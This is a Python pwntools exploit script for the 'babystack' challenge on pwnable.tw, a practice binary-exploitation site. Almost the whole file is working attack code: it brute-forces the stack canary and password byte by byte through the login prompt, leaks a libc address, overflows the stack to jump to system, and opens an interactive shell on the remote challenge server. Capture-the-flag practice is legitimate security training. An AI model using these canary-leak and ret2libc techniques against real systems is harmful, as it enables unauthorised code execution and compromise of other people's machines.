from pwn import * 
import os 
import subprocess
from tqdm import tqdm
context.arch = "amd64"
# context.log_level = "debug"
context.os = "linux"
context.terminal = ["tmux", "splitw", "-h"]

def get_text_base(pid):
    cmd = f"cat /proc/{pid}/maps" + " | head -1 | awk -F- \'{print $1}\'"
    return int(subprocess.check_output(cmd, shell= True),16)

def get_libc_base(pid):
    cmd = f"cat /proc/{pid}/maps" + "| grep libc | head -1 | awk -F- \'{print $1}\'"
    return int(subprocess.check_output(cmd, shell= True),16)


def gdb_scripts(text_base,*breakpoints):
    cmd = f"set $base={text_base}\n"
    for b in breakpoints:
        cmd+= f"b *{text_base+b}\n"
    cmd += "c\n"
    print(cmd)
    return cmd

def choice(io,ch):
    io.sendafter(b">> ", ch)

def login(io,pswd):
    choice(io,b"1")
    io.sendafter(b"Your passowrd :",pswd)
    res = io.recvline()
    if b"Failed" in res:
        return False
    elif b"Login Success" in res:
        return True

def magic_copy(io,payload):
    choice(io,b'3')
    io.sendafter(b"Copy :",payload)

def overflow(io, canary, overflow_payload):
    payload = (canary+b"\x00").ljust(64, b"a")
    payload+= canary
    payload = payload.ljust(0x60, b"a")
    payload += overflow_payload
    login(io,payload)
    magic_copy(io, canary+b"a")

def leak_canary(io):
    pswd = b""
    for i in tqdm(range(16)):
        for j in tqdm(range(0x1,0x100)):
            tmp = pswd+p8(j)
            #info(f"Trying {tmp}")
            if login(io,tmp+b"\n") == True:
                pswd = tmp
                choice(io,b'1'*16)
                break
    if login(io, pswd):
        old_rbp = u64(pswd[-6:].ljust(8,b"\x00"))
        success(f"Passwd: {pswd[:16].hex()}")
        success("Leaked old rbp at "+hex(old_rbp))
        choice(io,b'1')
        return pswd[:16]
    else:
        print("Failed to leak")    

def leak_cannary_and_old_rbp(io:process,debug=False):
    info("Trying leak canary ...")
    if debug:
        text_base = get_text_base(pidof(io)[0])
        pswd_ptr = u64(io.leak(text_base+0x202020,8))
        success("passwd ptr: "+hex(pswd_ptr))
        pswd = io.leak(pswd_ptr,16)
    else: 
        pswd = b""
        for i in tqdm(range(16)):
            for j in tqdm(range(0x1,0x100)):
                tmp = pswd+p8(j)
                #info(f"Trying {tmp}")
                if login(io,tmp+b"\n") == True:
                    pswd = tmp
                    choice(io,b'1'*16)
                    break
        pswd += b"1"*16
        for i in tqdm(range(6)):
            for j in tqdm(range(0x1,0x100)):
                tmp = pswd+p8(j)
                #info(f"Trying {tmp}")
                if login(io,tmp+b"\n") == True:
                    pswd = tmp
                    choice(io,b'1'*16)
                    break

    if login(io, pswd):
        old_rbp = u64(pswd[-6:].ljust(8,b"\x00"))
        success(f"Passwd: {pswd[:16].hex()}")
        success("Leaked old rbp at "+hex(old_rbp))
        choice(io,b'1'*16)
        return pswd[:16],old_rbp
    else:
        print("Failed to leak")

def leak_libc(io,canary,_bin):
    # overflow(io,canary, b"a"*8 + p64(_bin.address + 0xB7E))
    # copy libc address to main_stack
    payload = (canary+b"\x00").ljust(64, b"a")
    payload+= canary
    login(io,payload)
    magic_copy(io, canary+b"a")
    choice(io,b'1')

    # then, brute force libc address
    pswd = canary+b"1"
    for i in tqdm(range(0x5)):
        for j in tqdm(range(0x1,0x100)):
            tmp = pswd+p8(j)
            #info(f"Trying {tmp}")
            if login(io,tmp+b"\n") == True:
                pswd = tmp
                choice(io,b'1')
                break
    return u64(pswd[-6:].ljust(8,b"\0"))

    pass

def hack(io,libc,_bin:ELF):
    # canary,old_rbp = leak_cannary_and_old_rbp(io)
    canary = leak_canary(io)
    # _bin.address = get_text_base(pidof(io)[0])
    libc.address = leak_libc(io,canary,_bin)
    libc.address = libc.address - (libc.address % 0x1000) - 0x3c4000
    success("leaked libc at "+hex(libc.address))

    overflow(io,canary,b"a"*8+p64(libc.sym["system"]))
    choice(io,"2;sh\x00")
    # gdb.attach(io, gdbscript=gdb_scripts(_bin.address, 0x1051))
    io.interactive()

DEBUG = False
if __name__ == '__main__':
    libc = ELF("./libc_64.so.6")
    _bin = ELF("./babystack")
    if DEBUG:
        io = process("./babystack")
        libc_base = get_libc_base(pidof(io)[0])
    else:
        io = remote("chall.pwnable.tw",10205)
    hack(io,libc,_bin)
